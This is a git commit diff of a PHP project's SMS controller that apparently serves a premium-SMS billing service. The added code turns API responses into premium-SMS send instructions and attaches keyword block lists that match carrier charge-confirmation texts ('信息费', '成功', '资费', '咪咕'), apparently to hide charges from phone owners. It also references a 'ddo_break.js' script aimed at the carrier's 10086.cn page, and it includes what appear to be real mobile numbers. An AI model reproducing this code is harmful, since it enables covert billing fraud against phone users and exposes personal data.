8f7e106f98fb53396277df05d6ca0237f0103560
manwolf <1554122661@qq.com>
2016-04-25 16:14:01 +0800

    测试

--- commands/SmsController.php
+++ commands/SmsController.php
@@ -25,26 +25,85 @@ class SmsController extends Controller
      * @param string $message the message to be echoed.
      */
     public function actionIndex(){
-    	$url = 'http://local.pluto.com/index.php/Out/CMP/ss/3subR6msNi?spcode=1066666666&mobile=18740207122&linkid=12321634124321313&mo=342111&status=DELIVRD';
-     	$response = Util::getRequest($url);
-// 	   	$expression = json_decode($response,true);
-//     	print_r($expression);
-echo $response;
-    
+    	$response = <<<EOC
+{"res":{"ch_id":"5321","ch_type":"507","ch_name":"华胜移动动漫渠道包_暴风包月15元","ch_desc":"","detail":"","corp_type":"","spnumber":"","sms_msg":"","scheme":"1","phone":"18701617138","amount":"1500","real_amount":"1500","orderid":"FCS16042221410272","isMonthly":"","fee_url":"","open_url":null,"sms_interval":"","sms_count":"1","sms_separator":"","sms_reply_num":"","sms_reply_keyword":null,"sms_reply_content":"","is_net_game":"29","fee_code_type":null,"game_code_detail":null,"sub_order_ids":null,"sdk_fee_type":"29","corp_fee_code":null,"wap_fee_match":null,"yzm_regx":"","again_interval":"","js_url_map":{"10086.cn":"http://fee.arc-soft.com:11000/sdk3/view/js/ddo_break.js"},"monthly":""},"msg":"ok","status":0}    	
+EOC;
+    	//echo mb_convert_encoding($response, "UTF-8", "GBK");
+    	
+    	$response = json_decode($response, TRUE);
+    	print_r($response);
+    	$logFile = 'abd.log';
+    	if(Util::_array($response, 'status',1) == 0){
+    		Util::plog("[{}] # 请求API成功\n", $logFile,true);
+    		
+    		$smsArr 		= Util::_array($response,'res');
+    		$spOid 	= Util::_array($smsArr,'orderid');
+    		$smsCount 	= Util::_array($smsArr,'sms_count');
+    		$scheme 		= Util::_array($smsArr,'scheme');
+    		if ($smsCount == 1) {// 3-短信代计费 直发模式
+    			$pp = Util::_array($smsArr,'spnumber');
+    			$pc = base64_decode(Util::_array($smsArr,'sms_msg'));
+    			Util::plog("[] # Single类型的通道\n", $logFile,true);
+    			Util::plog("[]pp:{$pp}\npc:{$pc}\n", $logFile,true);
+    			$ch = array('type' => 1, 'sid' => '', 'detail' => array(
+    					'pp' => $pp,
+    					'pc' => $pc,
+    					'bkList' => array(
+    							array('port' => '1', 'keys' => array('成功' => 1, '费' => 1, '信息费' => 1, '电信代收' => 1)),
+    							array('port' => '1', 'keys' => array('话费支付' => 1, '感谢' => 1,'购买' => 1, '支付' => 1, '客服' => 1)),
+    							array('port' => '1', 'keys' => array('点播' => 1, '咪咕' => 1,'动漫' => 1, '业务' => 1, '资费' => 1, '费用' => 1)),
+    					)
+    			));    			
+    			$res['data'] = $ch;
+    			$res['flag'] = 1;
+    		}elseif ($smsCount == 2){// 3-短信代计费 直发模式
+    			$ppArr = explode('@@@', Util::_array($smsArr,'spnumber'));
+    			$pcArr = explode('@@@', base64_decode(Util::_array($smsArr,'sms_msg')));
+    			$pp = Util::_array($ppArr,0);
+    			$pc = Util::_array($pcArr,0);
+    			$pp2 = Util::_array($ppArr,1);
+    			$pc2 = Util::_array($pcArr,1);
+    			Util::plog("[{}]Double类型的通道\n", $logFile,true);
+    			Util::plog("[{}]pp:{$pp}\npc:{$pc}\npp2:{$pp2}\npc2:{$pc2}\n", $logFile,true);
+    			$ch = array('type' => 2, 'sid' => '', 'detail' => array(
+    					'pp1' 	=> $pp,
+    					'pc1' 	=> $pc,
+    					'pp2' 	=> $pp2,
+    					'pc2' 	=> $pc2,
+    					'sl' 	=> Util::_array($smsArr,'sms_interval')),
+    					'bkList' => array(
+    							array('port' => '1', 'keys' => array('成功' => 1, '费' => 1, '信息费' => 1, '电信代收' => 1)),
+    							array('port' => '1', 'keys' => array('点播' => 1, '咪咕' => 1,'动漫' => 1, '业务' => 1, '资费' => 1, '费用' => 1)),
+    					)
+    			);
+    			
+    			$res['data'] = $ch;
+    			$res['flag'] = 1;
+    		}else{//URL类型  //1-短信验证码 模式 URL 形式
+    			Util::plog("[]触发验证码成功\n", $logFile,true);
+    			$res['resultCode'] 	= 1;
+    		}
+    		$res['msg'] 		= 'success';
+    	}else{
+    		Util::plog("[] # 请求API失败\n", $logFile,true);
+    		
+    	}
+    	print_r($res);
     	echo "\n end \n";
-//      $json = '\u8d44\u8d39\u683c\u5f0f\u9519\u8bef';
-//      	$pc2 = Util::unicode_decode($json);
-// 		echo  $pc2 . "\n";
+     //$json = '\u9A8C\u8BC1\u7801\u786E\u8BA4\u5931\u8D25,\u624B\u673A\u4F59\u989D\u4E0D\u8DB3\u6216\u8D85\u8FC7\u9650\u989D';
+     //	$pc2 = Util::unicode_decode($json);
+		//echo  $pc2 . "\n";
     }
     
+    
     public function actionTest(){
-    	$url = 'http://local.pluto.com/index.php/Out/CMP?';
-    	$json = '{"cpparam":"313WRLsvWG3FT","status":"0","linkid":"f7addf9f6e10445e5fc7fc24280b979d","msg":"mghyjrsw99z3ZV","fee":"4","ss":"NnedVTtSjA"}';
+    	$url = 'http://ydpayreq.i9188.net:8500/spApi/yddmApiNewReq.do?';
+    	$json = '{"status":"DELIVRD","spid":"15294","mobile":"18924448669","linkid":"sms20160412150151965","msg":"ZDZF&02110108040994000&1000&&ZJL010&100&3&122&8AB6D","port":"1000","cpparam":"122","fee":"1000","province":"\u5e7f\u4e1c","action":"MMDXS"}';
 		$api = array(
 					'url' 		=> $url,
 					'data' 	=> json_decode($json,true),
 					'get'		=> 1,
-					'format'	=> 'text'
+					'format'	=> 'json'
 			);			
 		
 		$response 	= Util::api($api);
@@ -71,11 +130,11 @@ echo $response;
      * 测试2
      */
     public function actionTest2(){
-    	$url = 'http://local.pluto.com/index.php/Out/CMP/ss/WXAcnzrmKq?';
-    	$json = '{"spnumber":"1194","mobile":"15856910960","linkid":"f7addf9f6e10445e5fc7fc24280b979d","msg":"mghyjrsw99z3ZV","fee":"4","ss":"WXAcnzrmKq"}';
+    	$url = 'http://pluto.maimob.net/index.php/Out/CMP/ss/cJinsNucsB?';
+    	$json = '{"linkid":"20160418095620581uGklZy3c4G3o","cpparam":"GC0paR50PJ","mobile":"13156257953","port":"106566660020","msg":"000000015021","status":"DELIVRD","ss":"ZICHLfJXEj"}';
 		$api = array(
 					'url' 		=> $url,
-					'data' 	=> $json,
+					'data' 	=> json_decode($json,true),
 					'get'		=> 0,
 					'format'	=> 'text'
 			);		
--- controllers/SiteController.php
+++ controllers/SiteController.php
@@ -90,77 +90,7 @@ class SiteController extends Controller
     }
 
     public function actionAbout(){
-		    if (isset($_SERVER['PHP_AUTH_DIGEST'])) { 
-		    $header['AUTHORIZATION'] = $_SERVER['PHP_AUTH_DIGEST']; 
-		} elseif (isset($_SERVER['PHP_AUTH_USER']) && isset($_SERVER['PHP_AUTH_PW'])) { 
-		    $header['AUTHORIZATION'] = base64_encode($_SERVER['PHP_AUTH_USER'] . ':' . $_SERVER['PHP_AUTH_PW']); 
-		} 
-		if (isset($_SERVER['CONTENT_LENGTH'])) { 
-		    $header['CONTENT-LENGTH'] = $_SERVER['CONTENT_LENGTH']; 
-		} 
-		if (isset($_SERVER['CONTENT_TYPE'])) { 
-		    $header['CONTENT-TYPE'] = $_SERVER['CONTENT_TYPE']; 
-		}
-		var_dump($header);
-    }
-    
-    public function actionSay(){
-    		//$response = file_get_contents("php://input");
-    		//获取域名或主机地址
-    		print_r($_SERVER);
-    	echo $_SERVER['HTTP_HOST']."<br>"; #localhost
-    	
-    	//获取网页地址
-    	echo $_SERVER['PHP_SELF']."<br>"; #/blog/testurl.php
-    	
-    	//获取网址参数
-    	echo $_SERVER["QUERY_STRING"]."<br>"; #id=5
-    	
-    	//获取用户代理
-    	//echo $_SERVER['HTTP_REFERER']."<br>";
-    	
-    	//获取完整的url
-    	echo 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
-    	echo 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?'.$_SERVER['QUERY_STRING'];
-    	#http://localhost/blog/testurl.php?id=5
-    	
-    	//包含端口号的完整url
-    	echo 'http://'.$_SERVER['SERVER_NAME'].':'.$_SERVER["SERVER_PORT"].$_SERVER["REQUEST_URI"];
-    	#http://localhost:80/blog/testurl.php?id=5
-    	
-    	echo $_SERVER['REQUEST_METHOD']; // GET  POST 
-    	//只取路径
-    	$url='http://'.$_SERVER['SERVER_NAME'].$_SERVER["REQUEST_URI"];
-    	echo dirname($url);
-    }
-    
-    /**
-     * 创建表单
-     */
-    public function actionEntry(){
-    		$model = new EntryForm();
-    		if( $model->load(Yii::$app->request->post()) && $model->validate() ){
-    			//验证$model 收到的数据
-    			
-    			return $this->render('entry-confirm',['model' => $model]);
-    		}else{
-    			return $this->render('entry',['model' => $model]);
-    		}
-    }
-    
-    public function actionGet(){
-//     	print_r($_SERVER);
-//     	print_r($_POST);
-//     	print_r($_REQUEST);
-    	$model = new LoginForm();
-    	if ($model->load(Yii::$app->request->post())) {
-    		$data = $_POST; // file_get_contents("php://input");
-    	}else{
-    		$data = 'no';
-    	}
-    	return $data;
-    	//var_dump( $data );
-    	
-    }
+    	return $this->render('about');
+    }    
     
 }
